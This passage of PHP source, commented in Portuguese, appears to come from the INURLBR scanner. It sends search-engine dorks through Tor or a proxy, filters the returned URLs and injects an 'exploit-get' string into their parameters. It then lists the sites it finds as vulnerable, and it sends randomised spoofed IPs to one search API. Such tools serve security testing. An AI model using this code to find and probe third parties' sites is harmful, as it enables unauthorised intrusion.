    return implode("=", str_replace($get_, $get_ . ((isset($_SESSION['config']['exploit-get'])) ? $_SESSION['config']['exploit-get'] : NULL), $_url));
}

################################################################################################################################################################
#FILTRAR TODAS URLS DO HTML RETORNO DOS BUSCADORES##############################

function filtroUrl($html) {
    $match = NULL;
    preg_match_all("#\b((((ht|f)tps?://)|(www|ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i", $html, $match);
    return array_unique($match[0]);
}

################################################################################################################################################################
#FIM DE PROCESSOS CONTANDO URLS/VULL E PRINTANDO URLS/VULL######################

function exitProcesso() {
    $cont = count(explode("\n\r", $_SESSION['config']['resultado_vull'])) - 1;
    echo "\n\n\033[1;37m  [+]----------------------------------------------------------------------------------------------------------------------------------\033[0m";
    echo "\n\033[1;37m0x\033[0m\033[02;31mTOTAL URLS VULNERABLE::\033[1;37m [ {$cont} ]\033[0m\n";
    print_r($_SESSION['config']['resultado_vull']);
    exit();
}

################################################################################################################################################################
#PROCESSO FILTRO DE URLS E VALIDANDO URL VALIDAS################################

function subProcesso($resultado, $motorNome) {

    if (isset($resultado)) {
        foreach ($resultado as $result) {
            $blacklist = "google.,uol.,youtube.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,";
            $blacklist.= "live.,microsoft.,ask.,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,dmoz.,gigablast.,aol.,";
            $blacklist.="aolcdn.,altavista.,clusty.,teoma.,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,";
            $blacklist.="4shared.,stackoverflow.,gstatic.,php.net,wikipedia.,webcache.";
            $url = ($motorNome == 'ajax.googleapis.com') ? $result["url"] : $result;
            if (!is_null($url) && !empty($url) && !validarOpcoes($blacklist, $url, 1)) {
                $_SESSION["config"]["totas_urls"].="[URL]{$url}";
            }
        }
    }
}

################################################################################################################################################################
#DEBUGAR VALORES E PROCESSOS####################################################

function debug($valor, $op = NULL) {

    return isset($_SESSION["config"]["debug"]) && validarOpcoes($_SESSION["config"]["debug"], $op) ? "DEBUG=> " . print_r($valor) . "\r\n" : NULL;
}

################################################################################################################################################################
#CODIGO MOTORES DE BUSCA########################################################
$_SESSION['config']['cod'] = ' 
!is_null($_SESSION["config"]["tor-random"]) && !is_null($_SESSION["config"]["proxy"]) ? renovaTOR() : null;
echo "\033[1;37m0x\033[0m\033[02;31m::SEARCHING::\033[1;37m{\033[0m ";

plus();
$dork = (isset($dork)) ? $dork : sair("DEFINA SUA DORK");

################################################################################
#MOTOR DE BUSCA google
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 1) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    echo "\033[1;37m0x\033[0m\033[02;31m[LOADING...] \033[1;37m}\033[0m";
    $motorNome = "www.google.com.br";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
    $curlObject = curl_init();
    $url_motor = "https://www.google.com.br/search?q={$dork}&num=1500&btnG=Search";
    debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
    subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
    plus();
}

################################################################################
#MOTOR DE BUSCA bing
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 2) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "www.bing.com";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
    for ($pag = 1; $pag < 991; $pag = $pag + 50) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $curlObject = curl_init();
        $url_motor = "http://www.bing.com/search?q={$dork}&&filt=rf&first={$pag}";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA yahoo
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 3) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "br.search.yahoo.com";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
    for ($pag = 1; $pag <= 471; $pag = $pag + 10) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $url_motor = "http://search.yahoo.com/search?p={$dork}&ei=UTF-8&b={$pag}";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA ask
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 4) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "www.ask.com";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
    for ($pag = 0; $pag <= 16; $pag++) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $random = base64_encode(intval(rand() % 255) . intval(rand() % 2553333));
        $url_motor = "http://www.ask.com/web?q={$dork}&page={$pag}&qid={$random}";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA hao123
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 5) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "search.hao123.com.br";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
    for ($pag = 0; $pag <= 750; $pag = $pag + 10) {
        echo "\033[1;37m0x\033[0m[####]";
        plus(); 
        $random = base64_encode(intval(rand() % 255) . intval(rand() % 2553333));
        $url_motor = "http://search.hao123.com.br/s?tn={$random}&f=0&wd={$dork}&haobd={$random}FG=1&ie=utf-8&pn={$pag}&showTop=0";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA googleapis
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 6) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "ajax.googleapis.com";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
    for ($pag = 0; $pag <= 56; $pag = $pag + 4) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $ip = intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255);
        $url_motor = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&rsz=8&q={$dork}&start={$pag}&userip={$ip}&filter=1&safe=off";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(json_decode(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"], true)["responseData"]["results"], $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA lycos
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 7) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $_SESSION["config"]["idPesquisaLycos"] = getIdPesquisaLycos(request_info($curlObject_id = curl_init(), "http://search.lycos.com", $_SESSION["config"]["proxy"], $postDados)["corpo"]);
    $motorNome = "search.lycos.com";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");

    for ($pag = 0; $pag < 24; $pag++) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $url_motor = "http://search.lycos.com/web?q={$dork}&keyvol={$_SESSION["config"]["idPesquisaLycos"]}&pn={$pag}";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA uol.com.br
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 8) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "busca.uol.com.br";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");

    for ($pag = 10; $pag < 130; $pag = $pag + 10) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $url_motor = "http://busca.uol.com.br/web/?q={$dork}&start={$pag}";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA us.yhs4.search.yahoo
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 9) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "us.yhs4.search.yahoo.com";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");

    for ($pag = 1; $pag <= 751; $pag = $pag + 10) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $url_motor = "http://us.yhs4.search.yahoo.com/yhs/search?p={$dork}&fr=goodsearch-yhsif&b={$pag}";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA sapo.pt
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 10) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "pesquisa.sapo.pt";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");

    for ($pag = 0; $pag <= 14; $pag++) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $url_motor = "http://pesquisa.sapo.pt/?adultfilter=strict&barra=resumo&cluster=0&format=html&limit=10&location=pt&page={$pag}&q={$dork}&st=web";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA dmoz
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 11) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    $motorNome = "www.dmoz.org";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");

    for ($pag = 0; $pag <= 1000; $pag = $pag + 20) {
        echo "\033[1;37m0x\033[0m[####]";
        plus();
        $url_motor = "http://www.dmoz.org/search/search?q={$dork}&start={$pag}&type=next&all=yes&cat=";
        debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
        subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
        plus();
    }
}

################################################################################
#MOTOR DE BUSCA gigablast
################################################################################
if (validarOpcoes($_SESSION["config"]["motor"], 12) || validarOpcoes($_SESSION["config"]["motor"], "all")) {
    plus();
    echo "\033[1;37m0x\033[0m[LOADING...]";
    $motorNome = "www.gigablast.com";
    echo ("\n\033[1;37m0x\033[0m\033[02;31mENGINE::\033[1;37m{ \033[0;32m{$motorNome} \033[1;37m}\033[0m\n");
    plus();
    $url_motor = "http://www.gigablast.com/search?k3h=223119&s=22&rat=0&sc=1&ns=100&n=100&sites=&q={$dork}";
    debug("\n\033[1;37m0x\033[0m\033[02;31mURL ENGINE::\033[1;37m{ \033[0;34m{$url_motor} \033[1;37m}\033[0m", 1);
    subProcesso(filtroUrl(request_info($curlObject = curl_init(), $url_motor, $_SESSION["config"]["proxy"], $postDados)["corpo"]), $motorNome);
    plus();
}

plus(); ';

################################################################################################################################################################
#EXECUTAR BUSCA COM MOTORES#####################################################

function main($dork, $motor, $cod) {
    $dork = ((strstr($dork, '[DORK]'))) ? explode('[DORK]', $dork) : array($dork); // MULTIPLAS DORKS
    echo bannerLogo();
    for ($i = 0; $i <= count($dork); $i++) {
        if (!empty($dork[$i])) {
            echo "\r\n\033[1;37m0x\033[0m\033[02;31mDORK::\033[1;37m{ {$dork[$i]}  }\r\n";
            $objNovaBusca = create_function('$dork, $motor', $cod);
            $objNovaBusca(urlencode($dork[$i]), $motor);
            echo "\n\r";
        }
    }

    processo($_SESSION["config"]["totas_urls"]);
    (!isset($_SESSION['config']['extrai-email']) ? exitProcesso() : "\n\r\033[1;37m0x\033[0m\033[02;31mSAVED EMAILS::\033[0m {$_SESSION['config']['arquivo_output']}");
}

################################################################################################################################################################
#EXECUTAR VALIDAÇÃO/PROCESSOS COM ARQUIVO TXT###################################
if (!is_null($_SESSION['config']['abrir-arquivo'])) {
    abrirArquivotxt($_SESSION['config']['abrir-arquivo']);
    plus();
    exitProcesso();
}

################################################################################################################################################################
#EXECUTAR BUSCA COM MOTORES#####################################################
main($_SESSION['config']['dork'], $_SESSION['config']['motor'], $_SESSION['config']['cod']);

function extra() {
    $banners = array(
        "
d888888b d8b   db db    db d8888b. db      d8888b. d8888b. 
  `88'   888o  88 88    88 88  `8D 88      88  `8D 88  `8D 
   88    88V8o 88 88    88 88oobY' 88      88oooY' 88oobY' 
   88    88 V8o88 88    88 88`8b   88      88~~~b. 88`8b   
  .88.   88  V888 88b  d88 88 `88. 88booo. 88   8D 88 `88. 
Y888888P VP   V8P ~Y8888P' 88   YD Y88888P Y8888P' 88   YD 
", "
.####.##....##.##.....##.########..##..........########..########.....###.....######..####.##......
..##..###...##.##.....##.##.....##.##..........##.....##.##.....##...##.##...##....##..##..##......
..##..####..##.##.....##.##.....##.##..........##.....##.##.....##..##...##..##........##..##......
..##..##.##.##.##.....##.########..##..........########..########..##.....##..######...##..##......
..##..##..####.##.....##.##...##...##..........##.....##.##...##...#########.......##..##..##......
..##..##...###.##.....##.##....##..##..........##.....##.##....##..##.....##.##....##..##..##......
.####.##....##..#######..##.....##.########....########..##.....##.##.....##..######..####.########
 ", "
88 888b      88 88        88 88888888ba  88          88888888ba  88888888ba   
88 8888b     88 88        88 88       8b 88          88       8b 88       8b  
88 88 `8b    88 88        88 88      ,8P 88          88      ,8P 88      ,8P  
88 88  `8b   88 88        88 88aaaaaa8P' 88          88aaaaaa8P' 88aaaaaa8P'  
88 88   `8b  88 88        88 88     88'  88          8       8b, 88    88'    
88 88    `8b 88 88        88 88    `8b   88          88      `8b 88    `8b    
88 88     `8888 Y8a.    .a8P 88     `8b  88          88      a8P 88     `8b   
88 88      `888   `Y8888Y'   88      `8b 88888888888  88888888P  88      `8b  
     ", "
 ___ _   _ _   _ ____  _     ____  ____  
|_ _| \ | | | | |  _ \| |   | __ )|  _ \ 
 | ||  \| | | | | |_) | |   |  _ \| |_) |
 | || |\  | |_| |  _ <| |___| |_) |  _ < 
|___|_| \_|\___/|_| \_\_____|____/|_| \_\
", "
 _  _  _           _           _        _            _       _  _  _  _           _                    _  _  _  _           _  _  _  _       
(_)(_)(_)         (_) _       (_)      (_)          (_)     (_)(_)(_)(_) _       (_)                  (_)(_)(_)(_) _       (_)(_)(_)(_) _    
   (_)            (_)(_)_     (_)      (_)          (_)     (_)         (_)      (_)                   (_)        (_)      (_)         (_)   
   (_)            (_)  (_)_   (_)      (_)          (_)     (_) _  _  _ (_)      (_)                   (_) _  _  _(_)      (_) _  _  _ (_)   
   (_)            (_)    (_)_ (_)      (_)          (_)     (_)(_)(_)(_)         (_)                   (_)(_)(_)(_)_       (_)(_)(_)(_)      
   (_)            (_)      (_)(_)      (_)          (_)     (_)   (_) _          (_)                   (_)        (_)      (_)   (_) _       
 _ (_) _          (_)         (_)      (_)_  _  _  _(_)     (_)      (_) _       (_) _  _  _  _        (_)_  _  _ (_)      (_)      (_) _    
(_)(_)(_)         (_)         (_)        (_)(_)(_)(_)       (_)         (_)      (_)(_)(_)(_)(_)      (_)(_)(_)(_)         (_)         (_)   
                                                                                                                                                   
", "
                                     /~\
                                    |oo )      /INURLBR
                                    _\=/_
                    ___        #   /  _  \   #
                   /() \        \\//|/.\|\\//
                 _|_____|_       \/  \_/  \/
                | | === | |         |\ /|
                |_|  O  |_|         \_ _/
                 ||  O  ||          | | |
                 ||__*__||          | | |
                |~ \___/ ~|         []|[]
                /=\ /=\ /=\         | | |
________________[_]_[_]_[_]________/_]_[_\_________________________
", "
 ______   __  __  __  __  ____    __       ____     ____       
/\__  _\ /\ \/\ \/\ \/\ \/\  _`\ /\ \     /\  _`\  /\  _`\     
\/_/\ \/ \ \ `\\ \ \ \ \ \ \ \L\ \ \ \    \ \ \L\ \\ \ \L\ \   
   \ \ \  \ \ , ` \ \ \ \ \ \ ,  /\ \ \  __\ \  _ <'\ \ ,  /   
    \_\ \__\ \ \`\ \ \ \_\ \ \ \\ \\ \ \L\ \\ \ \L\ \\ \ \\ \  
    /\_____\\ \_\ \_\ \_____\ \_\ \_\ \____/ \ \____/ \ \_\ \_\
    \/_____/ \/_/\/_/\/_____/\/_/\/ /\/___/   \/___/   \/_/\/ /
", "
    __      ______     __________   ____     ________  ________    
`MM`MM\     `M`MM'     `M`MMMMMMMb. `MM'     `MMMMMMMb.`MMMMMMMb.  
 MM MMM\     M MM       M MM    `Mb  MM       MM    `Mb MM    `Mb  
 MM M\MM\    M MM       M MM     MM  MM       MM     MM MM     MM  
 MM M \MM\   M MM       M MM     MM  MM       MM    .M9 MM     MM  
 MM M  \MM\  M MM       M MM    .M9  MM       MMMMMMM(  MM    .M9  
 MM M   \MM\ M MM       M MMMMMMM9'  MM       MM    `Mb MMMMMMM9'  
 MM M    \MM\M MM       M MM  \M\    MM       MM     MM MM  \M\    
 MM M     \MMM YM       M MM   \M\   MM       MM     MM MM   \M\   
 MM M      \MM  8b     d8 MM    \M\  MM    /  MM    .M9 MM    \M\  
_MM_M_      \M   YMMMMM9 _MM_    \M\_MMMMMMM _MMMMMMM9'_MM_    \M\_
", "
                           ______                                  
                        .-.      .-.                               
                       /            \                              
                      |  [ INURLBR ] |                             
                      |,  .-.  .-.  ,|                             
                      | )(|_/  \|_)( |                             
                      |/     /\     \|                             
              _       (_     ^^     _)                             
      _\ ____) \_______\__|IIIIII|__/_______________________________     
     (_)[___]{}<________|-\IIIIII/-|__INURL__INURL__INURL___________\    
       /     )_/        \          /                               
                         \ ______ / 
"
    );

    return ($banners[rand(0, count($banners) - 1)]);
}
